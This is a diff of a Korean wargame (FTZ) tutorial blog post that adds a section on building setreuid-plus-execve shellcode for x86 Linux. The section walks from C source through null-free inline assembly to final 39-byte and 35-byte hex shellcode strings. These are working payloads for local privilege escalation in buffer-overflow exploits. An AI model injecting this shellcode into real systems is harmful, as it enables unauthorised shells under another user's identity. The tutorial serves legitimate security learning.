@@ -17,6 +17,15 @@ tags: [FTZ]
 
 최적화된 기계어 코드를 얻는다.  
 
+-> <a href="#onlybash">쉘만 실행하는 25 byte 쉘코드</a>
+
+-> <a href="#setreuid">setreuid 함수 호출이 포함된 39 byte 쉘코드</a>
+
+<hr>
+
+<p><a id="onlybash"></a></p>
+# 쉘만 실행하는 25 byte 쉘코드  
+
 ## 1) Linux 쉘을 실행하는 C언어 프로그램 작성
 
 Linux 쉘을 실행하는 C 소스코드는 아래와 같다.  
@@ -353,5 +362,145 @@ int main(void)
 
 위 사진과 같이 쉘코드가 정상적으로 실행하는 것을 확인할 수 있습니다.  
 
+<hr> 
+
 <p><a id="setreuid"></a></p>
-## 8) setreuid가 포함된 쉘코드 만들기  
+# setreuid 함수 호출이 포함된 39 byte 쉘코드  
+
+## 1) Linux 쉘을 실행하는 C언어 프로그램 작성  
+
+``` c
+// shcode.c
+#include <unistd.h>
+int main(void) {
+        char *sh[2];
+        sh[0] = "/bin/sh";
+        sh[1] = NULL;
+
+        setreuid(3100,3100);
+        execve(sh[0], sh, NULL);
+        return 0;
+}
+```
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/14.png" | relative_url }}' alt='relative'>  
+
+``` bash
+gcc -static -o shcode shcode.c
+```
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/15.png" | relative_url }}' alt='relative'>  
+
+main 함수에서 setreuid 함수를 호출하기 위해 스택에 0xc1c(=3100)을 2번 push 합니다.  
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/16.png" | relative_url }}' alt='relative'>  
+
+setreuid 함수 내부를 확인해보니 두 매개변수는 ebx, ecx 레지스터에 저장됩니다.  
+
+그럼 eax에는 왜 0x46(=70)이 저장될까요?  
+바로 setreuid 함수의 호출 번호입니다.  
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/17.png" | relative_url }}' alt='relative'>  
+
+``` bash
+cat /usr/include/asm/unistd.h | grep "setreuid"
+```
+
+## 2) 어셈블리어로 쉘코드 작성
+
+setreuid 함수를 호출하는 것은 execve 함수로 /bin/sh를 호출한 것보다 훨씬 간단합니다.  
+
+### 1) 불필요한 부분 제거  
+
+setreuid 함수를 실행하기 위해 꼭 필요한 내용은 다음과 같습니다.  
+-> 매개변수 값을 레지스터에 넣기 (ebx, ecx에 0xc1c 값 넣기)  
+
+-> setreuid 함수 호출 번호를 레지스터에 넣기 (eax에 0x46 값 넣기)  
+
+-> setreuid 함수 호출하기 (int $0x80)  
+
+### 2) 최적화된 어셈블리어 코드 제작  
+
+setreuid 함수를 호출하기 위해 eax에는 0x46을, ebx와 ecx에는 0xc1c를 넣어주고 함수를 호출하는 명령어만 있으면 됩니다.  
+
+즉, 3가지 내용을 어셈블리어로 제작하면 다음과 같습니다.  
+
+``` c
+// intel format
+mov ebx, 0xc1c
+mov ecx, ebx
+mov eax, 0x46
+int 0x80
+```
+
+### 3) 어셈블리어 작성 및 NULL 문자열 수정  
+
+2번에서 간단하게 작성한 어셈블리어는 NULL 문자열을 포함하기 때문에  
+NULL 문자열을 포함하지 않도록 수정해야 합니다.  
+
+그래서 0xc1c 값을 저장하는 데 32bit ebx 레지스터 대신 16bit bx 레지스터를 사용하고,  
+0x46 값을 저장하는 데 32bit eax 레지스터 대신 하위 8bit al 레지스터를 사용해야 합니다.  
+
+또한, xor 연산을 하는 이유는 이전에 쓰여졌을 수 있던 레지스터에 남은 잔여 데이터를 없애고 0으로 초기화하기 위함입니다.  
+
+이를 고려하여 작성한 어셈블리어 코드는 다음과 같습니다.  
+
+``` c
+// realsh.c
+// AT&T format
+void main(){
+        __asm__ __volatile__(
+				// setreuid 함수
+                "xor %ebx, %ebx         \n\t"
+                "mov $0xc1c, %bx        \n\t"
+                "mov %ebx, %ecx         \n\t"
+                "xor %eax, %eax         \n\t"
+                "mov $0x46, %al         \n\t"
+                "int $0x80              \n\t"
+				// execve 함수
+                "xor %eax,%eax          \n\t"
+                "push %eax              \n\t"
+                "push $0x68732f2f       \n\t"
+                "push $0x6e69622f       \n\t"
+                "mov %esp, %ebx         \n\t"
+                "push %eax              \n\t"
+                "push %ebx              \n\t"
+                "mov %esp, %ecx         \n\t"
+                "mov %eax, %edx         \n\t"
+                "mov $0xb, %al          \n\t"
+                "int $0x80              \n\t"
+        );
+}
+```
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/18.png" | relative_url }}' alt='relative'>  
+
+-> 어셈블리어 컴파일  
+
+``` bash
+gcc -static -o realsh realsh.c
+```
+
+-> 기계어 확인  
+
+``` bash
+objdump -M intel -d realsh | grep \<main\> -A 30
+```
+
+<img data-action="zoom" src='{{ "assets/ftz/shellcode/19.png" | relative_url }}' alt='relative'>  
+
+
+-> 39 byte 쉘코드 획득  
+
+``` bash
+\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
+```
+
+-> 35 byte 쉘코드 획득  
+
+xor 연산이 없는 쉘코드 (xor %ebx, %ebx, xor %eax, %eax)  
+
+``` bash
+\x66\xbb\x1c\x0c\x89\xd9\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
+```
+
